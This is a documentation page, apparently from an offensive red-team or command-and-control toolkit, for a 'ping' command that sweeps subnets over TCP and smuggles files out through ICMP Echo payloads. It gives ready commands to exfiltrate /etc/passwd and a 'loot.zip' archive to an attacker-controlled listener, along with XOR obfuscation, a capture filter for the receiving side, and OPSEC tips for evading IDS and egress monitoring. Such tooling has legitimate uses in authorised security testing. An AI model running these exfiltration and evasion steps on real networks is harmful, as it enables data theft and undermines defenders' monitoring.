+++
title = "ping"
chapter = false
weight = 207
hidden = false
+++

## Summary

TCP connect-based host reachability check with subnet sweep support, and **ICMP data exfiltration**. Two modes:

- **Default (TCP ping):** Probes a specified port on target hosts to determine reachability. Works at normal user privilege levels.
- **exfil-icmp:** Encodes file data in ICMP Echo Request payloads for covert exfiltration through firewalls that allow ICMP (T1048.003). Requires root/admin.

## Arguments

### TCP Ping (Default)

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| hosts | Yes | | Target host(s) — single IP, comma-separated, CIDR (192.168.1.0/24), or dash range (192.168.1.1-254) |
| port | No | 445 | TCP port to probe |
| timeout | No | 1000 | Timeout per host in milliseconds |
| threads | No | 25 | Concurrent connections (max: 100) |

### ICMP Exfiltration

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | | Must be `exfil-icmp` |
| target | Yes | | Destination IP for ICMP packets (attacker-controlled listener) |
| file | No | | File path to exfiltrate |
| data | No | | Raw string data to exfiltrate (alternative to file) |
| chunk_size | No | 1024 | Bytes per ICMP payload (max: 1400) |
| delay | No | 100 | Delay between packets in ms |
| jitter | No | 50 | Max additional random delay in ms |
| xor_key | No | 0 | XOR encoding key (0-255, 0=none) |

## Usage

Check single host:
```
ping -hosts 192.168.1.1
```

Sweep a /24 subnet on SMB port:
```
ping -hosts 192.168.1.0/24 -port 445 -timeout 1000 -threads 50
```

Sweep a range:
```
ping -hosts 10.0.0.1-50 -port 22
```

Check multiple named hosts:
```
ping -hosts dc01,dc02,web01 -port 389
```

## Output

Shows alive hosts with open ports and connection latency. Only hosts with open ports are listed in the results table.

### ICMP Exfiltration Examples

Exfiltrate a file via ICMP:
```
ping -action exfil-icmp -target 10.0.0.5 -file /etc/passwd -delay 200
```

Exfiltrate with XOR encoding (avoids plaintext in ICMP payloads):
```
ping -action exfil-icmp -target 10.0.0.5 -file /tmp/loot.zip -xor_key 42 -chunk_size 512
```

Exfiltrate raw data:
```
ping -action exfil-icmp -target 10.0.0.5 -data "sensitive data here"
```

### Receiving ICMP Exfil Data

On the attacker machine, capture ICMP packets with identifier `0xFA57`:
```bash
sudo tcpdump -i eth0 'icmp[0]=8 and icmp[4:2]=0xFA57' -w exfil.pcap
```

The first packet (sequence 0) contains a header with total chunks, total size, and XOR key. Subsequent packets contain data chunks in sequence order.

## OPSEC Considerations

### TCP Ping
- TCP connect creates a full connection (SYN → SYN-ACK → ACK → RST). This generates network events and may be logged by firewalls/IDS.
- Large sweeps (e.g., /16) are noisy. Use smaller ranges and lower thread counts for stealth.
- Port 445 (default) is commonly monitored. Consider using port 80 or 443 for less suspicious probing.

### ICMP Exfiltration
{{% notice warning %}}CRITICAL: Requires root/admin privileges for raw ICMP sockets{{% /notice %}}

- ICMP payloads larger than 64 bytes are anomalous and flagged by most IDS/DPI systems
- Regular timing patterns between packets indicate tunneling — use jitter to vary intervals
- XOR encoding is basic obfuscation, not encryption — it prevents plaintext matching but not statistical analysis
- Network egress monitoring may block or alert on unusual ICMP volume

## MITRE ATT&CK Mapping

- **T1018** — Remote System Discovery
- **T1048.003** — Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- **T1095** — Non-Application Layer Protocol
